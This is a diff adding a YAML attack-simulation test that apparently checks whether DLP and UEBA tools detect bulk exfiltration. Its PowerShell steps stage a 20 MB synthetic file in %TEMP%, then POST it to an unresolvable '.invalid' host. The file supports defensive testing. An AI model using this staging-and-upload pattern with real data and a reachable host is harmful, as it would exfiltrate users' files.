@@ -1,0 +1,126 @@
+id: collection-large-volume-transfer
+product_line: dlp
+name: Large-Volume Outbound Transfer Probe
+description: >
+  Telemetry-safe emulation of a bulk outbound transfer: a 20 MB synthetic file is
+  staged and then sent in one upload attempt. Bulk volume is what volume-based
+  egress thresholds and UEBA are designed to catch, so this checks whether a
+  large outbound transfer is noticed. The file is synthetic [BAS-SIM] text. The
+  destination is an RFC-6761 .invalid host, so no bytes leave the host.
+
+  KILL CHAIN STAGES:
+    1. Bulk Staging   — write a 20 MB synthetic file under %TEMP% (T1074.001)
+    2. Bulk Upload    — POST the 20 MB file to an RFC-6761 .invalid host (T1048.003)
+
+  SAFETY: The file is synthetic and deleted in cleanup. The destination is a .invalid
+  host and cannot resolve. The write is capped at 20 MB and the upload at a 15-second
+  timeout. No real data is read or sent. Windows only. Telemetry mode.
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+tags:
+  - exfiltration
+  - volume
+  - ueba
+  - egress
+  - dlp
+  - t1074
+  - t1048
+  - mitre
+mitre_phases:
+  - collection
+  - exfiltration
+
+live_policy:
+  block_on_domain_controller: true
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Stage 1 — Bulk Staging (T1074.001)
+  # ---------------------------------------------------------------------------
+  - name: "Bulk Exfil 1 — 20 MB Synthetic Staging File (T1074.001)"
+    technique_id: T1074.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 60
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Writes one 20 MB file of repeating [BAS-SIM] text under %TEMP%\\bas_bulk_<runid>. The file is removed in cleanup. Disk use is 20 MB, and the write is capped at that size."
+    telemetry:
+      - "Sysmon EID 11: 20 MB file created under %TEMP%\\bas_bulk_<runid>"
+      - "EDR: rapid large-file write from a user process"
+    detection:
+      - "UEBA/EDR: single large file created in a temp folder ahead of an outbound transfer"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_bulk_$runId"
+      New-Item -ItemType Directory -Path $work -Force | Out-Null
+      $bulk = Join-Path $work 'bulk_synthetic.bin'
+      $marker = [System.Text.Encoding]::ASCII.GetBytes("[BAS-SIM] bulk synthetic block run=$runId`n")
+      $target = 20MB
+      $fs = [System.IO.File]::Open($bulk, 'Create', 'Write')
+      try {
+        $written = 0
+        while ($written -lt $target) {
+          $n = [Math]::Min($marker.Length, $target - $written)
+          $fs.Write($marker, 0, $n)
+          $written += $n
+        }
+      } finally { $fs.Close() }
+      $size = (Get-Item $bulk).Length
+      Write-Output "EXEC T1074.001: staged a synthetic bulk file of $size bytes at $bulk. Bulk Stage 1. [BAS-SIM-BLK-S1]"
+      Write-Output "FAIL: A 20 MB file was staged in a temp folder with no alert. Large single-file staging ahead of transfer should be visible to UEBA."
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 2 — Bulk Upload Attempt (T1048.003)
+  # ---------------------------------------------------------------------------
+  - name: "Bulk Exfil 2 — 20 MB Upload Attempt to .invalid (T1048.003)"
+    technique_id: T1048.003
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 60
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "POSTs the 20 MB synthetic file from Stage 1 to an RFC-6761 .invalid host over HTTP with a 15-second timeout. The host cannot resolve, so no bytes leave the host. Generates Sysmon EID 22 and EID 3."
+    telemetry:
+      - "Sysmon EID 22: DNS query for the bas-sim .invalid host"
+      - "Network/egress: a 20 MB outbound POST attempt, if the request is ever routed"
+    detection:
+      - "Volume-based egress: a single outbound transfer above the bulk threshold — exfil alert expected"
+      - "UEBA: outbound volume far above the endpoint's baseline"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $bulk = Join-Path $env:TEMP "bas_bulk_$runId\bulk_synthetic.bin"
+      if (-not (Test-Path $bulk)) {
+        Write-Output "SKIP T1048.003: no bulk file from Stage 1 to send. [BAS-SIM-BLK-S2]"
+        exit 0
+      }
+      $target = "http://bas-sim-bulk-$runId.invalid/upload"
+      $reached = $false
+      try {
+        $r = Invoke-WebRequest -Uri $target -Method Post -InFile $bulk -ContentType 'application/octet-stream' -TimeoutSec 15 -UseBasicParsing
+        if ($r.StatusCode) { $reached = $true }
+      } catch { $reached = $false }
+      Write-Output "EXEC T1048.003: attempted a 20 MB HTTP POST of a synthetic bulk file to $target. reached=$reached (expected: false). Bulk upload Stage 2. [BAS-SIM-BLK-S2]"
+      if ($reached) {
+        Write-Output "FAIL: A 20 MB outbound transfer to an unknown host succeeded. Volume-based egress controls are not limiting bulk transfers."
+      } else {
+        Write-Output "FAIL: The endpoint attempted a 20 MB outbound transfer to an unknown host with no volume alert. Unreachable only because the domain is .invalid; the volume is the signal egress and UEBA should alert on."
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_bulk_*') -Recurse -Force -ErrorAction SilentlyContinue
